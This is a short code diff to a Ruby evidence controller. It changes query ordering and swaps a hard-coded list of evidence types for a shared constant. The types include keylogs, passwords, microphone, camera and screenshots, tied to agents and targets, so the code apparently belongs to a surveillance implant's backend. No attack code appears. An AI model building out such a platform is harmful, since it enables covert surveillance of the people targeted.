@@ -251,10 +251,10 @@ class EvidenceController < RESTController
       if @params.has_key? 'startIndex' and @params.has_key? 'numItems'
         start_index = @params['startIndex'].to_i
         num_items = @params['numItems'].to_i
-        query = filtering.where(filter_hash).without(:body).order_by([[:_id, :asc]]).skip(start_index).limit(num_items)
+        query = filtering.where(filter_hash).without(:body).order_by([[:dr, :asc], [:_id, :asc]]).skip(start_index).limit(num_items)
       else
         # without paging, return everything
-        query = filtering.where(filter_hash).without(:body).order_by([[:_id, :asc]])
+        query = filtering.where(filter_hash).without(:body).order_by([[:dr, :asc], [:_id, :asc]])
       end
 
       return ok(query, {gzip: true})
@@ -361,11 +361,8 @@ class EvidenceController < RESTController
         condition[:aid] = filter['agent']
       end
 
-      types = ["addressbook", "application", "calendar", "call", "camera", "chat", "clipboard", "device",
-               "file", "keylog", "position", "message", "mic", "mouse", "password", "print", "screenshot", "url"]
-
       stats = []
-      types.each do |type|
+      ::Evidence::TYPES.each do |type|
         query = {type: type}.merge(condition)
         stats << {type: type, count: Evidence.collection_class(target[:_id]).where(query).count}
       end
